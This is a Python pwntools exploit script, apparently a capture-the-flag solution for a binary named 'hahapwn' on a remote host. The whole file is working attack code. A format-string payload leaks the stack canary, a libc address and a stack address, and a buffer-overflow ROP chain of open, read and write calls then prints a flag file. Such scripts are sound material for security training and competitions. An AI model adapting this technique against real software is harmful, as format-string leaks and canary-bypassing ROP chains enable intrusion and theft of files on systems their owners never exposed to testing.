from pwn import *

#io = process('./hahapwn')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = remote('210.30.97.133',28059)
libc = ELF('./libc-2.23.so')
elf = ELF('./hahapwn')
context.log_level = 'debug'

read_got= elf.got['read']
puts_plt = elf.plt['puts']
pop_rdi = 0x400943


raw_input()
#fmtstr = b'AAAAAAAA%p%p%p%p%p%p%p%p%p%p'
#fmtstr =  '%27$paaa%7$s' + p64(read_got) 
#fmtstr = b'%27$paaa%8$s\x00\x00\x00\x00' + p64(read_got)
fmtstr = b'%27$p%8$s%25$pqq' + p64(read_got) + b'flag\0'
io.recvuntil(b'your name?')
io.send(fmtstr)
io.recvuntil(b'Hello \n')
leak = io.recvuntil(b'qq',drop = True)
canary = leak[:18]
read_addr = leak[18:24]
flag_addr = leak[24:42]
read_addr = read_addr.ljust(0x8,b'\x00')
read_addr = u64(read_addr)
libc.address = read_addr - libc.sym.read
canary = int(canary,16)
flag_addr = int(flag_addr,16)
flag_addr -= 0xe8
# flag_addr = flag_addr + 0x48 - 0x200
log.success("canary : " + hex(canary))
log.success("read: " + hex(read_addr))
log.success("libc base: " + hex(libc.address))
log.success("flag addr: " + hex(flag_addr))

raw_input()

# ORW ROP
pop_rsi = 0x202e8 + libc.address    # remote
pop_rdx = 0x1b92 + libc.address     # remote
#pop_rsi = 0x2601f+ libc.address    # local 
#pop_rdx = 0x142c92+ libc.address     # local

rop = b'a' * 0x68 + p64(canary) + b'b' * 8  
rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(libc.sym.open)  +  p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x601070) + p64(pop_rdx) + p64(0x30) + p64(libc.sym.read)  + p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(0x601070) + p64(pop_rdx) + p64(0x30) + p64(libc.sym.write)
# rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(libc.sym.open)  +  p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr - 0x200) + p64(pop_rdx) + p64(0x30) + p64(libc.sym.read)  + p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(flag_addr - 0x200) + p64(pop_rdx) + p64(0x30) + p64(libc.sym.write)
#rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(libc.sym.open)  +  p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(libc.sym.read)  + p64(pop_rdi) +  p64(flag_addr)  + p64(puts_plt)

rop += p64(libc.sym.exit)
io.recvuntil(b'What can we help you?\n')
io.send(rop)


io.interactive()
